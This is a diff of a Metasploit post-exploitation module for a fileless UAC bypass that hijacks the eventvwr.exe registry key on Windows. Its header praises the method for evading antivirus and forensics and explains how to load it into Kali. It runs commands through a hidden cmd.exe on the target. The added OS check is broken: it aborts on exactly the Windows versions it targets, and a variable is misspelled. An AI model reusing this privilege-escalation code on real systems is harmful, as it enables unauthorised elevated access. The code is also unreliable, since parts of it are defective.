@@ -14,6 +14,7 @@
 # POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
 #
 #
+#
 # [ DESCRIPTION ]
 # Most of the UAC bypass techniques require dropping a file to disk (for example, placing a DLL on disk
 # to perform a DLL hijack). The technique used in this module differs from the other public methods and
@@ -27,23 +28,19 @@
 # has been achieved in a high integrity process (bypassing UAC) without dropping a DLL or other file down to
 # the file system. This significantly reduces the risk to the attacker because they aren’t placing a traditional
 # file on the file system that can be caught by AV/HIPS or forensically identified later.
-# "This module differs from OJ msf module because it uses cmd.exe insted of powershell.exe"
+# "This module differs from 'OJ msf module' because it uses cmd.exe insted of powershell.exe"
 #
 #
 #
-#
-# [ MODULE DEFAULT OPTIONS ]
+# [ MODULE OPTIONS ]
 # The session number to run this module on  => set SESSION 3
 # The cmd.exe command to be executed        => set CMD_COMMAND start firefox.exe www.househot.com
 # Delete malicious registry key hive?       => set DEL_REGKEY true
-#
-#
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
 # Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
 # Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
 # Manually Path Search: root@kali:~# locate modules/post/windows/escalate
-#
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
@@ -170,6 +167,7 @@ def ls_stage1
       Rex::sleep(1.0)
     else
        # registry hive key not found, aborting module execution.
+       print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command")
        print_error("Post-module cant find the registry hive key needed...")
        print_error("System does not apper to be vuln to the exploit code!")
        print_line("")
@@ -230,6 +228,7 @@ def ls_stage2
       Rex::sleep(1.0)
     else
        # registry hive key not found, aborting module execution.
+       print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
        print_error("Post-module cant find the registry hive key needed...")
        print_error("System does not apper to be vuln to the exploit code!")
        print_line("")
@@ -238,7 +237,7 @@ def ls_stage2
     end
 
  # Delete hijacking hive keys from target regedit...
- # REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f
+ # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
  print_good(" Deleting hive registry keys...")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
@@ -288,6 +287,15 @@ def run
     print_line("")
 
 
+    #
+    # the 'def check' funtion that rapid7 requires.
+    # Guidelines for Accepting Modules: goo.gl/OQ6HEE
+    #
+    # check for proper operative system 
+    if sysinfo['OS'] =~ /Windows (7|8|2008|2012|10)/
+      print_error("[ ABORT ]:This post-module only works against windows systems")
+      raise Rex::Script::Completed
+    end
     # check for proper session (meterpreter)
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
